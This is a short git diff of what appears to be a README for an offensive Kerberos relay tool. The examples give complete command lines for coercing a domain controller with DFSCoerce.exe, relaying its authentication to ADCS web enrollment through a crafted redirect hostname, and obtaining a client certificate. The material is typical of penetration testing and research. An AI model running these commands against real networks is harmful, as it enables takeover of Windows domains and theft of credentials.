@@ -18,7 +18,7 @@ I'll leave it to you to clean it up and create a more optimized version ;)
 ### Examples
 
 ````
-# Relay the DC SMB authentication to HTTP (ADCS) web enrollment and request client certificate using a socat redirector lsitening on port 9999:<br>
+# Relay the DC SMB authentication to HTTP (ADCS) web enrollment and request client certificate using a linux box redirecting to windows attacker machine on port 9999:<br>
 krbRelay.exe -spn http/adcs-mylab.mylab.local -redirecthost adcs-mylab1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA -endpoint certsrv  -adcs DomainController -listenerport 9999<br>
 In another window:
 DFSCoerce.exe -l adcs-mylab1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA  -t DC-2
